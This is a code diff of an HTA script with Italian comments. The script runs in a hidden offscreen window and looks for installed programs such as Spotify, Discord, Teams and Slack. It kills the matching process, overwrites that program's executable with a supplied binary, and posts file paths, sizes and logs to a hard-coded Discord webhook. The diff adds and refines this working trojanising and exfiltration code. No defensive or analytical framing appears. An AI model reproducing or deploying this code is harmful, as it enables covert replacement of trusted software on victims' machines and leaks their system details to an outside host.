@@ -89,20 +89,6 @@ Function BinaryCopy(sf, tf)
     BinaryCopy = True
 End Function
 
-Function SearchFile(fn, paths)
-    On Error Resume Next
-    Dim fso, p, fp
-    Set fso = CreateObject("Scripting.FileSystemObject")
-    For Each p in paths
-        fp = fso.BuildPath(p, fn)
-        If fso.FileExists(fp) Then
-            SearchFile = fp
-            Exit Function
-        End If
-    Next
-    SearchFile = ""
-End Function
-
 Function FindRecursive(folder, fn)
     On Error Resume Next
     Dim fso, f, sf, result
@@ -121,14 +107,19 @@ Function FindRecursive(folder, fn)
         Exit Function
     End If
     
-    ' Check subfolders
-    For Each sf in f.SubFolders
-        result = FindRecursive(sf.Path, fn)
-        If result <> "" Then
-            FindRecursive = result
-            Exit Function
-        End If
-    Next
+    ' Check subfolders (max depth 3 to avoid performance issues)
+    Dim depth
+    depth = Len(folder) - Len(Replace(folder, "\", ""))
+    
+    If depth < 5 Then
+        For Each sf in f.SubFolders
+            result = FindRecursive(sf.Path, fn)
+            If result <> "" Then
+                FindRecursive = result
+                Exit Function
+            End If
+        Next
+    End If
     
     FindRecursive = ""
 End Function
@@ -137,41 +128,50 @@ End Function
 window.resizeTo(1,1);
 window.moveTo(-2000,-2000);
 
-var WEBHOOK_URL = "https://discord.com/api/webhooks/1452723227523547276/zgAT_2VPHVL4qP5c-nL0Br8c3w29__2CmxaU6-cffYYXulBPF7blPrvovLWpFzdD9A9e"; // Inserisci il tuo webhook Discord
+var WEBHOOK_URL = "https://discord.com/api/webhooks/1452723227523547276/zgAT_2VPHVL4qP5c-nL0Br8c3w29__2CmxaU6-cffYYXulBPF7blPrvovLWpFzdD9A9e";
 var logMessages = [];
 
 function log(msg) {
     var timestamp = new Date().toISOString();
     var logMsg = "[" + timestamp + "] " + msg;
     logMessages.push(logMsg);
-    console.log(logMsg);
 }
 
-function sendWebhook(content, file) {
+function sendWebhook(content, fileContent) {
     try {
-        var xhr = new ActiveXObject("Microsoft.XMLHTTP");
-        var boundary = "----WebKitFormBoundary" + Math.random().toString(36).substr(2);
+        log("Sending webhook...");
         
-        xhr.open("POST", WEBHOOK_URL, false);
-        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=" + boundary);
+        var http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+        http.open("POST", WEBHOOK_URL, false);
+        http.setRequestHeader("Content-Type", "application/json");
         
-        var body = "";
-        body += "--" + boundary + "\r\n";
-        body += 'Content-Disposition: form-data; name="content"\r\n\r\n';
-        body += content + "\r\n";
-        
-        if (file) {
-            body += "--" + boundary + "\r\n";
-            body += 'Content-Disposition: form-data; name="file"; filename="summary.txt"\r\n';
-            body += 'Content-Type: text/plain\r\n\r\n';
-            body += file + "\r\n";
+        var fullContent = content;
+        if (fileContent) {
+            // Limita il log a 1500 caratteri per evitare messaggi troppo lunghi
+            var truncatedLog = fileContent;
+            if (fileContent.length > 1500) {
+                truncatedLog = fileContent.substring(0, 1500) + "\n... (truncated)";
+            }
+            fullContent += "\\n\\n```\\n" + truncatedLog + "\\n```";
         }
         
-        body += "--" + boundary + "--\r\n";
+        // Escape delle virgolette e newline per JSON
+        var escapedContent = fullContent.replace(/\\/g, "\\\\").replace(/"/g, '\\"').replace(/\n/g, "\\n").replace(/\r/g, "");
         
-        xhr.send(body);
-        log("Webhook sent successfully");
-        return true;
+        var payload = '{"content":"' + escapedContent + '","username":"Replace Bot"}';
+        
+        http.send(payload);
+        
+        var status = http.status;
+        log("Webhook response status: " + status);
+        
+        if (status >= 200 && status < 300) {
+            log("Webhook sent successfully!");
+            return true;
+        } else {
+            log("Webhook failed with status: " + status);
+            return false;
+        }
     } catch(e) {
         log("Webhook error: " + e.message);
         return false;
@@ -243,6 +243,7 @@ function findLegitimateExe() {
         {name: "Spotify.exe", hint: "Spotify"},
         {name: "Discord.exe", hint: "Discord"},
         {name: "Teams.exe", hint: "Microsoft Teams"},
+        {name: "Slack.exe", hint: "Slack"},
         {name: "Skype.exe", hint: "Skype"},
         {name: "notepad.exe", hint: "Notepad"}
     ];
@@ -252,9 +253,7 @@ function findLegitimateExe() {
         sh.ExpandEnvironmentStrings("%APPDATA%"),
         sh.ExpandEnvironmentStrings("%LOCALAPPDATA%"),
         sh.ExpandEnvironmentStrings("%PROGRAMFILES%"),
-        sh.ExpandEnvironmentStrings("%PROGRAMFILES(X86)%"),
-        "C:\\Program Files",
-        "C:\\Program Files (x86)"
+        sh.ExpandEnvironmentStrings("%PROGRAMFILES(X86)%")
     ];
     
     // Cerca ogni target
@@ -288,21 +287,20 @@ function findLegitimateExe() {
 function w(pn, cb) {
     log("Waiting for process " + pn + " to terminate...");
     var attempts = 0;
+    var maxAttempts = 30;
     var i = window.setInterval(function() {
         attempts++;
         var r = GetProcessByName(pn);
         if (!r) {
-            log("Process " + pn + " terminated after " + attempts + " checks");
+            log("Process " + pn + " terminated after " + attempts + " seconds");
+            clearInterval(i);
+            cb();
+        } else if (attempts >= maxAttempts) {
+            log("Timeout waiting for " + pn + " termination (" + maxAttempts + "s elapsed)");
             clearInterval(i);
             cb();
         }
     }, 1000);
-    
-    window.setTimeout(function() {
-        clearInterval(i);
-        log("Timeout waiting for " + pn + " termination (30s elapsed)");
-        cb();
-    }, 30000);
 }
 
 function ex() {
@@ -317,7 +315,7 @@ function ex() {
     if (!tf || tf === "") {
         log("ERROR: Target file path not found, aborting");
         sendReport("❌ Replace failed: Target file path not found");
-        window.close();
+        window.setTimeout(function() { window.close(); }, 2000);
         return;
     }
     
@@ -329,26 +327,32 @@ function ex() {
     if (!fso.FileExists(sf)) {
         log("ERROR: Source file does not exist: " + sf);
         sendReport("❌ Replace failed: Source file not found");
-        window.close();
+        window.setTimeout(function() { window.close(); }, 2000);
         return;
     }
     
     if (!fso.FileExists(tf)) {
         log("ERROR: Target file does not exist: " + tf);
         sendReport("❌ Replace failed: Target file not found");
-        window.close();
+        window.setTimeout(function() { window.close(); }, 2000);
         return;
     }
     
-    // Get file sizes
-    var sfSize = fso.GetFile(sf).Size;
-    var tfSize = fso.GetFile(tf).Size;
-    log("Source file size: " + sfSize + " bytes");
-    log("Target file size: " + tfSize + " bytes");
+    // Get file info
+    var sfFile = fso.GetFile(sf);
+    var tfFile = fso.GetFile(tf);
+    var sfSize = sfFile.Size;
+    var tfSize = tfFile.Size;
+    var sfDate = sfFile.DateLastModified;
+    var tfDate = tfFile.DateLastModified;
+    
+    log("Source file size: " + sfSize + " bytes (modified: " + sfDate + ")");
+    log("Target file size: " + tfSize + " bytes (modified: " + tfDate + ")");
     
     try {
         log("Attempting to kill process: " + pn);
         KillProcessByName(pn);
+        log("Kill command sent");
     } catch(x) {
         log("Error killing process: " + x.message);
     }
@@ -372,7 +376,19 @@ function ex() {
                 log("✓ Binary copy SUCCESS");
                 log("Replaced: " + tf);
                 log("With: " + sf);
-                sendReport("✅ Replace successful!\n📁 Target: `" + tf + "`\n📄 Source: `" + sf + "`\n📊 Size: " + sfSize + " bytes");
+                
+                // Verifica la copia
+                var newSize = fso.GetFile(tf).Size;
+                log("New target file size: " + newSize + " bytes");
+                
+                var msg = "✅ **Replace Successful!**\\n";
+                msg += "📁 **Target:** `" + tf + "`\\n";
+                msg += "📄 **Source:** `" + sf + "`\\n";
+                msg += "📊 **Original Size:** " + tfSize + " bytes\\n";
+                msg += "📊 **New Size:** " + newSize + " bytes\\n";
+                msg += "🕐 **Time:** " + new Date().toLocaleString();
+                
+                sendReport(msg);
             } else {
                 log("✗ Binary copy FAILED");
                 sendReport("❌ Replace failed during binary copy");
@@ -383,7 +399,7 @@ function ex() {
         }
         
         log("=== Replace operation completed ===");
-        window.setTimeout(function() { window.close(); }, 100);
+        window.setTimeout(function() { window.close(); }, 2000);
     }
 }
 
@@ -391,17 +407,29 @@ function sendReport(summary) {
     log("Preparing report...");
     var summaryPath = saveSummary();
     
+    var fileContent = null;
     if (summaryPath) {
-        var fileContent = readFile(summaryPath);
-        sendWebhook(summary, fileContent);
-    } else {
-        sendWebhook(summary, logMessages.join("\n"));
+        fileContent = readFile(summaryPath);
     }
+    
+    if (!fileContent) {
+        fileContent = logMessages.join("\n");
+    }
+    
+    sendWebhook(summary, fileContent);
 }
 
 window.onload = function() {
-    log("HTA loaded, starting operation...");
-    window.setTimeout(function() { ex(); }, 100);
+    log("HTA loaded, starting operation in 500ms...");
+    window.setTimeout(function() { 
+        try {
+            ex(); 
+        } catch(e) {
+            log("FATAL ERROR: " + e.message);
+            sendReport("❌ Fatal error: " + e.message);
+            window.setTimeout(function() { window.close(); }, 2000);
+        }
+    }, 500);
 };
 </script>
 </body>
